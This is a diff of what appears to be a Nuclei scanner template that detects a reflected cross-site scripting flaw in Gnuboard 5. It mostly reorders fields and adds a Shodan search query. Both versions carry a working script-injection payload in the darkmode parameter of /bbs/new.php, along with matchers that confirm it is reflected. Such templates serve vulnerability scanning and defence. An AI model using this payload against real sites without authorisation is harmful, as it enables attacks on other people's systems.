@@ -1,5 +1,4 @@
 id: gnuboard5-xss
-
 info:
   name: Gnuboard 5 - Cross-Site Scripting
   author: arafatansari
@@ -14,28 +13,25 @@ info:
     cwe-id: CWE-80
     cpe: cpe:2.3:a:gnuboard:gnuboard5:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
     max-request: 1
+    product: gnuboard5
+    shodan-query: http.html:"gnuboard5"
     vendor: gnuboard
-  tags: xss,gnuboard,gnuboard5,huntr,vuln
-
+    verified: true
+  tags: gnuboard,gnuboard5,huntr,vuln,xss
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
-
-    matchers-condition: and
-    matchers:
+  - matchers:
       - type: word
         words:
-          - 'header\"><script>alert(document.domain)</script>.css?'
-
-      - type: word
-        part: header
+          - header\"><script>alert(document.domain)</script>.css?
+      - part: header
+        type: word
         words:
           - text/html
-
-      - type: status
-        status:
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/bbs/new.php?darkmode=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
